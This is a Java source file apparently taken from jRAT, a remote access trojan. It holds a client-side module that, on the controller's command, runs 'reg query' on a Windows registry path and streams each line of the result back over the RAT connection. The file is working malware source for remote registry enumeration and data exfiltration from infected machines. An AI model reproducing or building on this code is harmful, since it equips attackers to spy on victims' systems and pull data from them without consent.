package jrat.module.registry;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Packet54Registry implements OutgoingPacket {

	private String path;

	public Packet54Registry(String path) {
		this.path = path;
	}

	@Override
	public void write(Connection con) throws Exception {
		try {
            con.writeLine(path);
			Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });

			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line;

			while ((line = reader.readLine()) != null) {
                con.writeBoolean(true);
                con.writeLine(line);
			}
			reader.close();

		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
            con.writeBoolean(false);
		}
	}

	@Override
	public short getPacketId() {
		return 54;
	}

}
